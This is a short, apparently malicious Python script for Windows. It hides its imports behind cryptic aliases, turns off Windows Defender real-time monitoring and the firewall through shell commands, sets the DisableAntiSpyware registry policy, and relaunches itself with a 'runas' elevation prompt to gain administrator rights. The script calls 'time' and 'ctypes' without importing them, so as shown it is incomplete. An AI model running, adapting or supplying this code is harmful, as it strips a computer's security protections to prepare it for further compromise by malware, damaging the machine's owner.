from sys import executable as syex
from sys import argv as arvsy
from winreg import HKEY_LOCAL_MACHINE as hklmch
from winreg import OpenKey as OPKY
from winreg import REG_DWORD as RDWRD
from winreg import SetValueEx as SVEX
from winreg import KEY_ALL_ACCESS as KAAC
from os import system as dds
time.sleep(1)

dds("powershell Set-MpPreference -DisableRealtimeMonitoring $true")
dds("netsh firewall set opmode disable")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

if is_admin():
    aKey = OPKY(hklmch, "SOFTWARE\Policies\Microsoft\Windows Defender", 0, KAAC)

    SVEX(aKey, "DisableAntiSpyware", 0, RDWRD, 1)
else:
    # Re-run the program with admin rights
    ctypes.windll.shell32.ShellExecuteW(None, "runas", syex, " ".join(arvsy), None, 1)


